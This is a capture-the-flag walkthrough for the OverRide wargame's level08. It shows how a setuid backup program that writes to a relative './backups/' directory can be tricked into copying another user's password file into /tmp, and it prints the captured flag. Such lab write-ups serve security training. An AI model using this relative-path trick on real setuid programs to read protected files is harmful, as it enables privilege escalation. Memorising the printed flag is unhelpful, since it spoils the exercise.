This level is quite special. It's asking for a argument, a file to open.

	level08@OverRide:~$ ./level08 
	Usage: ./level08 filename
	ERROR: Failed to open (null)

Simply we would like to open .pass that is inside level09.

	level08@OverRide:~$ ~/level08 ~level09/.pass
	ERROR: Failed to open ./backups//home/users/level09/.pass

Okay that will not work like that, let's head in the binary code to find the resolution.

Since the code is mostlikely unreadable I'll just explain it in plain words.

+ First of all it `fopen(./backups/.log)` 
+ Secondly it will `fopen(av[1])` that's where we get **.pass**
+ Then the program create a file with `open(./backups/ + av[1])` and store the flag

With that said I need to create the path where .pass file will be created.\
**ERROR: Failed to open ./backups//home/users/level09/.pass** do you remember this line.\
`av[1] = ~/level09/.pass = /home/users/level09/`\
So I just need to create a folder level09 inside backups.

I cannot create anything inside home so I'll just go to /tmp.

	level08@OverRide:/tmp$ mkdir -p ./backups/home/users/level09

It will work because level08 use **./backups** is a relative path so it will search the backups folder from the current path where level08 is executed.

	level08@OverRide:/tmp$ ~/level08 ~level09/.pass
	level08@OverRide:/tmp$ cat backups/home/users/level09/.pass 
	fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

ggwp !